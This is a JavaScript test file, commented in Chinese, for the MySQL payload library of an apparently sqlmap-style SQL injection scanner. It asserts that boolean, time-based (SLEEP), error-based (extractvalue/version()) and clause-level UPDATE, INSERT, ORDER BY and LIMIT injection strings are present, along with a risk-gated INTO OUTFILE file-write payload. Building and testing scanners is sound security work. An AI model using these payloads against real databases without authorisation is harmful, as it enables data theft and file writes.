// MySQL payload 库深度扩容验收测试（对标 sqlmap data/xml/payloads）
// 验证：注释符变体（# / /**/）、UPDATE/INSERT/LIMIT/ORDER BY 子句注入模板、
// 数字 OR 变体、编码变体，以及固定索引对 [0,2]/[1,3]/[4,5]/[6,7] 未被破坏
// （BooleanBlindDetector 依赖这些索引，任何追加只能 append 到数组末尾）。
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { PAYLOADS, fillPayload, CLAUSE_PAYLOADS, DESTRUCTIVE_PAYLOADS } from '../src/engine/payloads.js';

const BOOLEAN = PAYLOADS.MySQL.boolean;
const TIME = PAYLOADS.MySQL.time;
const ERROR = PAYLOADS.MySQL.error;

// —— 通用结构约束：扩容模板每条以 {ORIG} 开头、以 -- - / # / /**/ 结尾（对齐 sqlmap 边界约定）——
// 仅校验新增模板（索引 ≥8 的 boolean / 全文 error/time 均新增），原有布尔模板无注释属正常。
test('MySQL 扩容模板结构：新增模板以 {ORIG} 开头且以合法注释结尾', () => {
  const ends = (p) => p.endsWith('-- -') || p.endsWith('#') || p.endsWith('/**/');
  // error/time 全部新增（原模板都以 -- - 结尾，安全）
  for (const [tech, arr] of Object.entries({ time: TIME, error: ERROR })) {
    for (const p of arr) {
      assert.ok(p.startsWith('{ORIG}'), `[${tech}] 应以 {ORIG} 开头: ${p}`);
      assert.ok(ends(p), `[${tech}] 应以 -- - / # / /**/ 结尾: ${p}`);
    }
  }
  // boolean 仅校验新增模板（索引 ≥8，原有 0-7 无注释结尾）
  for (const p of BOOLEAN.slice(8)) {
    assert.ok(p.startsWith('{ORIG}'), `boolean 新增应以 {ORIG} 开头: ${p}`);
    assert.ok(ends(p), `boolean 新增应以 -- - / # / /**/ 结尾: ${p}`);
  }
});

// —— 1) 注释符变体（# 与 /**/）——
test('boolean 数组包含 # 与 /**/ 注释结尾变体（新增于索引 8+，不占前 8 项）', () => {
  assert.ok(BOOLEAN.includes("{ORIG}' AND 1=1#"), '应含 # 注释真条件');
  assert.ok(BOOLEAN.includes("{ORIG}' AND 1=2#"), '应含 # 注释假条件');
  assert.ok(BOOLEAN.includes("{ORIG}' AND 1=1/**/"), '应含 /**/ 注释真条件');
  assert.ok(BOOLEAN.includes("{ORIG}' AND 1=2/**/"), '应含 /**/ 注释假条件');
  // # 与 /**/ 变体位于索引 >=8（前 8 项是 BooleanBlindDetector 固定索引，不得占用）
  const idx = (p) => BOOLEAN.indexOf(p);
  for (const p of ["{ORIG}' AND 1=1#", "{ORIG}' AND 1=2#", "{ORIG}' AND 1=1/**/", "{ORIG}' AND 1=2/**/"]) {
    assert.ok(idx(p) >= 8, `${p} 必须位于索引 ≥8（实际 ${idx(p)}）`);
  }
});

test('time 数组包含 # 与 /**/ 注释结尾变体', () => {
  assert.ok(TIME.includes("{ORIG}' AND SLEEP({SLEEP})#"), 'time 应含 # 注释变体');
  assert.ok(TIME.includes("{ORIG}' AND SLEEP({SLEEP})/**/"), 'time 应含 /**/ 注释变体');
});

test('error 数组包含 # 与 /**/ 注释结尾变体', () => {
  assert.ok(ERROR.includes("{ORIG}' AND extractvalue(1,concat(0x7e,(SELECT version())))#"), 'error 应含 # 注释变体');
  assert.ok(ERROR.includes("{ORIG}' AND extractvalue(1,concat(0x7e,(SELECT version())))/**/"), 'error 应含 /**/ 注释变体');
});

// —— 2) UPDATE SET 子句注入（逗号拼接赋值 → 真/假差异；对标 sqlmap UPDATE SET clause）——
test('boolean 数组包含 UPDATE SET 子句注入模板（,1=1 / ,1=2）', () => {
  assert.ok(BOOLEAN.includes('{ORIG},1=1-- -'), 'UPDATE 真条件（逗号拼接赋值 1=1）');
  assert.ok(BOOLEAN.includes('{ORIG},1=2-- -'), 'UPDATE 假条件（逗号拼接赋值 1=2）');
  // 真/假差一赋值：1=1 恒真、1=2 恒假 → 可行布尔判定（UPDATE 位置不可用 AND 谓词）
  const trueT = fillPayload('{ORIG},1=1-- -', { orig: "name='a'" });
  const falseT = fillPayload('{ORIG},1=2-- -', { orig: "name='a'" });
  assert.notEqual(trueT, falseT);
  assert.ok(trueT.includes(",1=1-- -") && falseT.includes(",1=2-- -"));
});

test('time 数组包含 UPDATE SET 子句时间注入模板（,1=(SELECT SLEEP())）', () => {
  assert.ok(TIME.includes('{ORIG},1=(SELECT SLEEP({SLEEP}))-- -'), 'UPDATE 时间变体');
  assert.ok(fillPayload('{ORIG},1=(SELECT SLEEP({SLEEP}))-- -', { orig: "a='x'", sleep: 3 }).includes('SLEEP(3)'));
});

// —— 3) INSERT VALUES 子句注入（对标 sqlmap INSERT VALUES）——
test('boolean 数组包含 INSERT VALUES 子句注入模板（追加元组）', () => {
  assert.ok(BOOLEAN.includes('{ORIG}),(1,1)-- -'), 'INSERT 追加常量元组');
  assert.ok(BOOLEAN.includes('{ORIG}),(1,(SELECT 1))-- -'), 'INSERT 追加标量子查询元组');
});

test('error 数组包含 INSERT VALUES 子句报错注入模板（extractvalue 回带 version）', () => {
  const tpl = '{ORIG}),(1,(SELECT extractvalue(1,concat(0x7e,(SELECT version()))))) )-- -';
  assert.ok(ERROR.includes(tpl), 'INSERT VALUES 报错变体');
  assert.ok(tpl.includes('extractvalue') && tpl.includes('version()'), '应回带 version()');
});

// —— 4) LIMIT 子句注入（对标 sqlmap LIMIT clause）——
test('INTO OUTFILE 已移入 destructive 池；PROCEDURE ANALYSE 在 CLAUSE_PAYLOADS（level≥2 门控）', () => {
  // INTO OUTFILE 已从默认 error 池移至 destructive.js（risk≥3 门控，见 payloadSafety.guard.test.js）
  const destErr = DESTRUCTIVE_PAYLOADS.MySQL?.error || [];
  assert.ok(destErr.includes("{ORIG} INTO OUTFILE '/tmp/t'-- -"), 'destructive 池应含 INTO OUTFILE');
  // PROCEDURE ANALYSE 不在主数组（避免 level=1 误投放），但在 CLAUSE_PAYLOADS 中（level≥2 门控）
  const limitErr = CLAUSE_PAYLOADS.MySQL.limit.error;
  assert.ok(
    limitErr.some((t) => t.includes('PROCEDURE ANALYSE')),
    'CLAUSE_PAYLOADS.MySQL.limit.error 应含 PROCEDURE ANALYSE'
  );
});

test('boolean 数组包含 LIMIT 子句布尔变体', () => {
  assert.ok(BOOLEAN.includes('{ORIG} LIMIT 1,1-- -'), 'LIMIT 布尔变体');
});

// —— 5) ORDER BY 表达式注入（逗号拼接标量子查询；假=1/0 除零报错）——
test('boolean 数组包含 ORDER BY 表达式注入模板（(SELECT 1) vs (SELECT 1/0)）', () => {
  assert.ok(BOOLEAN.includes('{ORIG},(SELECT 1)-- -'), 'ORDER BY 真条件（恒真表达式）');
  assert.ok(BOOLEAN.includes('{ORIG},(SELECT 1/0)-- -'), 'ORDER BY 假条件（除零报错）');
});

test('time 数组包含 ORDER BY 表达式时间注入模板', () => {
  assert.ok(TIME.includes('{ORIG},(SELECT SLEEP({SLEEP}))-- -'), 'ORDER BY 时间变体');
});

// —— 6) 编码变体（对标 sqlmap 编码 payload：CHAR() 拼接 / hex 字符串）——
test('boolean 数组包含编码变体（CHAR(49) 与 hex 0x31）', () => {
  assert.ok(BOOLEAN.includes("{ORIG}' AND 1=CHAR(49)-- -"), 'CHAR() 编码变体');
  assert.ok(BOOLEAN.includes("{ORIG}' AND 0x31=1-- -"), 'hex 字符串编码变体');
});

// —— 7) 数字上下文 OR 变体（追加，对标 sqlmap risk>=2 OR 边界）——
test('boolean 数组包含数字 OR 变体（OR 1=1 / OR 1=2，位于 [6,7] 字符串 OR 之后）', () => {
  assert.ok(BOOLEAN.includes('{ORIG} OR 1=1-- -'), '数字 OR 真条件');
  assert.ok(BOOLEAN.includes('{ORIG} OR 1=2-- -'), '数字 OR 假条件');
  assert.ok(BOOLEAN.indexOf('{ORIG} OR 1=1-- -') > BOOLEAN.indexOf("{ORIG}' OR '1'='1"), '数字 OR 应位于字符串 OR 之后');
});

// —— 8) 现有索引对未被破坏（BooleanBlindDetector 依赖 [0,2]/[1,3]/[4,5]/[6,7]）——
test('固定索引对 [0,2]/[1,3]/[4,5]/[6,7] 仍指向布尔真假对（BooleanBlindDetector 依赖）', () => {
  const P = BOOLEAN;
  // [0,2]：单引号 '1'='1 / '1'='2
  assert.ok(P[0].includes("AND '1'='1"), `[0] 应为单引号真条件: ${P[0]}`);
  assert.ok(P[2].includes("AND '1'='2"), `[2] 应为单引号假条件: ${P[2]}`);
  // [1,3]：双引号 "1"="1 / "1"="2
  assert.ok(P[1].includes('AND "1"="1'), `[1] 应为双引号真条件: ${P[1]}`);
  assert.ok(P[3].includes('AND "1"="2'), `[3] 应为双引号假条件: ${P[3]}`);
  // [4,5]：数字型 AND 1=1 / AND 1=2
  assert.ok(P[4].includes('AND 1=1'), `[4] 应为数字真条件: ${P[4]}`);
  assert.ok(P[5].includes('AND 1=2'), `[5] 应为数字假条件: ${P[5]}`);
  // [6,7]：OR '1'='1 / OR '1'='2（risk>=2 投放）
  assert.ok(P[6].includes("OR '1'='1"), `[6] 应为 OR 真条件: ${P[6]}`);
  assert.ok(P[7].includes("OR '1'='2"), `[7] 应为 OR 假条件: ${P[7]}`);
  // 索引 0-7 未被任何扩容模板占用（扩容模板全部 append 在末尾）
  assert.equal(P.slice(0, 8).length, 8);
});

// —— 9) 追加不破坏相邻技术数组与克隆库（MariaDB/TiDB 复用 MySQL）——
test('追加后数组无重复模板且均含 {ORIG}（主数组唯一性约束延续）', () => {
  for (const [tech, arr] of Object.entries({ boolean: BOOLEAN, time: TIME, error: ERROR })) {
    const seen = new Set();
    for (const p of arr) {
      assert.ok(typeof p === 'string' && p.includes('{ORIG}'), `[${tech}] 缺 {ORIG}: ${p}`);
      assert.ok(!seen.has(p), `[${tech}] 存在重复模板: ${p}`);
      seen.add(p);
    }
  }
});

test('MariaDB/TiDB 克隆同步获得 MySQL 深度扩容（协议互通）', () => {
  assert.deepEqual(PAYLOADS.MariaDB.boolean, BOOLEAN, 'MariaDB boolean 应与 MySQL 完全一致');
  assert.deepEqual(PAYLOADS.TiDB.time, TIME, 'TiDB time 应与 MySQL 完全一致');
  assert.deepEqual(PAYLOADS.MariaDB.error, ERROR, 'MariaDB error 应与 MySQL 完全一致');
  assert.ok(PAYLOADS.TiDB.boolean.length > 8, 'TiDB boolean 深度扩容生效');
});

// —— 10) 新增模板数量统计（供实施报告核对）——
test('深度扩容模板数量：boolean +15 / time +4 / error +4（PROCEDURE ANALYSE 归 CLAUSE_PAYLOADS）', () => {
  assert.ok(BOOLEAN.length >= 23, `boolean 应 ≥23 条（8 基础 + 15 扩容），实际 ${BOOLEAN.length}`);
  assert.ok(TIME.length >= 14, `time 应 ≥14 条（10 基础 + 4 扩容），实际 ${TIME.length}`);
  assert.ok(ERROR.length >= 28, `error 应 ≥28 条（24 基础 + 4 扩容），实际 ${ERROR.length}`);
});